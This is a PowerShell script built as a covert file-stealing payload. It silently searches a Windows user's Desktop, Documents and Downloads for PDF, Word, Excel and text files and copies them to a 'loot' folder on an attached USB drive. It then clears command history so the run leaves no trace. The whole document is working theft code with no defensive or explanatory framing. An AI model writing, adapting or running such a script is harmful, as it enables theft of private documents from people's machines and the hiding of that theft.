# Run script in the background without console output
$ErrorActionPreference = "SilentlyContinue"

# Define target folders to search for specified file types
$sourceDirs = @(
    [System.Environment]::GetFolderPath('Desktop'),
    [System.Environment]::GetFolderPath('MyDocuments'),
    [System.IO.Path]::Combine($env:USERPROFILE, "Downloads")
)

# File types to search for (case insensitive)
$extensions = @(".pdf", ".docx", ".xlsx", ".txt")

# Get the last plugged-in removable USB drive
$usbDrive = Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Sort-Object DeviceID -Descending | Select-Object -First 1

if ($usbDrive) {
    $destinationDir = Join-Path -Path $usbDrive.DeviceID -ChildPath "loot"

    # Create the 'loot' folder if it doesn't exist
    if (!(Test-Path -Path $destinationDir)) {
        try {
            New-Item -Path $destinationDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
        } catch {
            exit
        }
    }

    # Search the specified folders for the defined file types and copy them to the loot folder
    foreach ($sourceDir in $sourceDirs) {
        if (Test-Path -Path $sourceDir) {
            $files = Get-ChildItem -Path $sourceDir -Recurse | Where-Object { 
                $extensions -contains $_.Extension.ToLower()
            }

            if ($files) {
                $files | ForEach-Object {
                    try {
                        # Copy each file to the loot folder on the USB drive
                        Copy-Item -Path $_.FullName -Destination $destinationDir -Force -ErrorAction Stop
                    } catch {
                        continue
                    }
                }
            }
        }
    }

    # Try to clear any history, like recently accessed files or logs
    Clear-History -ErrorAction SilentlyContinue

    # Remove any temporary files created by the script (if applicable)
    # You could add specific cleanup logic here if any files or temporary folders were created
}

# End the script without leaving any trace
exit
